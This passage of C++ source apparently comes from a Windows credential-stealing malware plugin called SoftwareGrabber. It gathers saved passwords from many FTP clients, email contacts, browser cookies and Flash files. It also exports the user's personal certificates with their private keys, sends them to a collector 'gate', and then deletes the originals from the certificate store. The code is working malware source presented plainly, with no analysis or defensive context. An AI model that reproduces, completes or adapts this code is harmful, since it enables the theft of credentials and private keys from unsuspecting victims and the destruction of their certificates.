		Fs::_removeDirectoryTree(path);
}
#pragma endregion GrabbingFunctions

void _ftpAll(void)
{
	_ftpFlashFxp3();
	_ftpCuteFtp();
	_ftpTotalCommander();
	_ftpWsFtp();
	_ftpFileZilla();
	_ftpFarManager();
	_ftpWinScp();
	_ftpFtpCommander();
	_ftpCoreFtp();
	_ftpSmartFtp();
}

void _emailAll(void)
{
	if(winVersion >= OsEnv::VERSION_VISTA)
	{
		_emailWindowsMail(false);
		_emailWindowsContacts();
	}
	else
	{
		_emailOutlookExpress();
		_emailWindowsAddressBook();
	}

	_emailWindowsMailRecipients();

	//Windows Live Mail может быть установлен на XP+.
	_emailWindowsMail(true);
}

void _cookiesAll(void)
{
	getIECookies();
	getFFCookies();
}

void _certsAll(void)
{
	//Getting Windows certs.
	if(!g_WriteData) return;
	LPWSTR storeName = L"MY";
	HANDLE storeHandle = CWA(crypt32, CertOpenSystemStoreW)(NULL, storeName);
	if(storeHandle != NULL)
	{
		//Получаем кол. сертификатов.
		DWORD certsCount = 0;
		{
			PCCERT_CONTEXT certContext = NULL;
			while((certContext = CWA(crypt32, CertEnumCertificatesInStore)(storeHandle, certContext)) != NULL)certsCount++;
		}

		if(certsCount != 0)
		{
			//Получаем размер хранилища.
			CRYPT_DATA_BLOB pfxBlob;
			pfxBlob.pbData = NULL;
			pfxBlob.cbData = 0;

			WCHAR password[] = L"GCert";
			if(CWA(crypt32, PFXExportCertStoreEx)(storeHandle, &pfxBlob, password, 0, EXPORT_PRIVATE_KEYS) != FALSE &&
			(pfxBlob.pbData = (LPBYTE)Mem::alloc(pfxBlob.cbData)) != NULL)
			{
				if(CWA(crypt32, PFXExportCertStoreEx)(storeHandle, &pfxBlob, password, 0, EXPORT_PRIVATE_KEYS) != FALSE)
				{
					//Делаем имя хранилища в нижний регистр.
					WCHAR storeNameLower[31 * 2];
					Str::_CopyW(storeNameLower, storeName, -1);
					CWA(kernel32, CharLowerW)(storeNameLower);

					//Генерируем имя.
					WCHAR userName[MAX_PATH];
					WCHAR pfxName[31 * 2];
					SYSTEMTIME st;
					CWA(kernel32, GetSystemTime)(&st);

					WCHAR serverPath[] = L"certs\\%s\\%s_%02u_%02u_%04u.pfx";
					getUserNameForPath(userName);

					if(Str::_sprintfW(pfxName, sizeof(pfxName) / sizeof(WCHAR), serverPath, userName, storeNameLower, st.wDay, st.wMonth, st.wYear) > 0)
					{
						g_WriteData(BLT_FILE, pfxName, pfxBlob.pbData, pfxBlob.cbData);
					}
				}
				Mem::free(pfxBlob.pbData);
			}
		}
		CWA(crypt32, CertCloseStore)(storeHandle, 0);
	}
	//Removing Windows certs.
	storeHandle = CWA(crypt32, CertOpenSystemStoreW)(NULL, storeName);
	if(storeHandle != NULL)
	{
		PCCERT_CONTEXT certContext = NULL;
		while((certContext = CWA(crypt32, CertEnumCertificatesInStore)(storeHandle, certContext)) != NULL)
		{
			PCCERT_CONTEXT dupCertContext = CWA(crypt32, CertDuplicateCertificateContext)(certContext);
			if(dupCertContext != NULL)CWA(crypt32, CertDeleteCertificateFromStore)(dupCertContext);
		}
		CWA(crypt32, CertCloseStore)(storeHandle, 0);
	}
}

static void _getVersion(void)
{
  DWORD ver = OsEnv::VERSION_UNKNOWN;
  OSVERSIONINFOEXW osvi;
  osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

  if(CWA(kernel32, GetVersionExW)((OSVERSIONINFOW *)&osvi) != FALSE && osvi.dwPlatformId == VER_PLATFORM_WIN32_NT)
  {
    if(osvi.wProductType == VER_NT_WORKSTATION)
    {
      //Windows 2000 - 5.0
      if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)ver = OsEnv::VERSION_2000;
      //Windows XP -  5.1
      else if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)ver = OsEnv::VERSION_XP;
      //Windows XP Professional x64 Edition - 5.2
      else if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)ver = OsEnv::VERSION_XP;
      //Windows Vista - 6.0
      else if(osvi.dwMajorVersion == 6  && osvi.dwMinorVersion == 0)ver = OsEnv::VERSION_VISTA;
      //Windows 7 - 6.1
      else if(osvi.dwMajorVersion == 6  && osvi.dwMinorVersion == 1)ver = OsEnv::VERSION_SEVEN;
	  //Windows 8 - 6.2
	  else if(osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2)ver = OsEnv::VERSION_EIGHT;
    }
    else if(osvi.wProductType == VER_NT_DOMAIN_CONTROLLER || osvi.wProductType == VER_NT_SERVER)
    {
      //Windows Server 2003 - 5.2, Windows Server 2003 R2 - 5.2, Windows Home Server - 5.2
      if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)ver = OsEnv::VERSION_S2003;
      //Windows Server 2008 - 6.0
      else if(osvi.dwMajorVersion == 6  && osvi.dwMinorVersion == 0)ver = OsEnv::VERSION_S2008;
      //Windows Server 2008 R2 - 6.1
      else if(osvi.dwMajorVersion == 6  && osvi.dwMinorVersion == 1)ver = OsEnv::VERSION_S2008R2;
	  //Windows Server 2012
	  else if(osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2)ver = OsEnv::VERSION_S2012;
    }
  }
  winVersion = ver;
}

bool APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	return true;
}

DllExport VOID __cdecl SoftwareGrabber::TakeGateToCollector3(void *lpGateFunc2)
{
	g_GateToCollector3 = (GATETOCOLLECTOR3)lpGateFunc2;
}

DllExport VOID __cdecl SoftwareGrabber::TakeWriteData(void *lpGateFunc4)
{
	g_WriteData = (WRITEDATA)lpGateFunc4;
}

DllExport BOOL __cdecl SoftwareGrabber::Start()
{
	if(!winVersion || !g_GateToCollector3) return false;
	EnterCriticalSection(&cs);
	//Knocking to the gate.
	{
		WCHAR knock[] = L"knock!";
		g_GateToCollector3(BLT_KNOCK, 0, knock, sizeof(knock) / sizeof(WCHAR));
	}

	HRESULT hr;
	if(ComLibrary::_initThread(&hr) && g_GateToCollector3)
	{
		if(flags & GRAB_FTPS) _ftpAll();
		if(flags & GRAB_EMAILS) _emailAll();
		if(flags & GRAB_COOKIES) _cookiesAll();
		if(flags & GRAB_CERTS) _certsAll();
		if(flags & GRAB_SOL) {_getMacromediaFlashFiles();_removeMacromediaFlashFiles();}

		ComLibrary::_uninitThread(hr);
		
	}
	LeaveCriticalSection(&cs);
	return true;
}

DllExport BOOL __cdecl SoftwareGrabber::Stop()
{
	DeleteCriticalSection(&cs);
	Str::Uninit();
	Mem::uninit();
	return true;
}

DllExport BOOL __cdecl SoftwareGrabber::Init(char *szConfig)
{
	if(!szConfig || IsBadReadPtr(szConfig, 1)) return false;
	InitializeCriticalSection(&cs);
	EnterCriticalSection(&cs);
	Mem::init(512*1024);
	Str::Init();
	_getVersion();

	if(StrStrIA(szConfig, "grab_all;"))
	{
		flags |= GRAB_ALL;
		goto ending;
	}
	if(StrStrIA(szConfig, "grab_emails;"))
	{
		flags |= GRAB_EMAILS;
	}
	if(StrStrIA(szConfig, "grab_ftps;"))
	{
		flags |= GRAB_FTPS;
	}
	if(StrStrIA(szConfig, "grab_cookies;"))
	{
		flags |= GRAB_COOKIES;
	}
	if(StrStrIA(szConfig, "grab_certs;"))
	{
		flags |= GRAB_CERTS;
	}
	if(StrStrIA(szConfig, "grab_sol;"))
	{
		flags |= GRAB_SOL;
	}
	ending:
	LeaveCriticalSection(&cs);
	return true;
}

#if BO_DEBUG > 0
DllExport VOID __cdecl SoftwareGrabber::TakeDebugGate(void* lpDebugGate)
{
	g_Debug = (DEBUGWRITESTRING)lpDebugGate;
}
#endif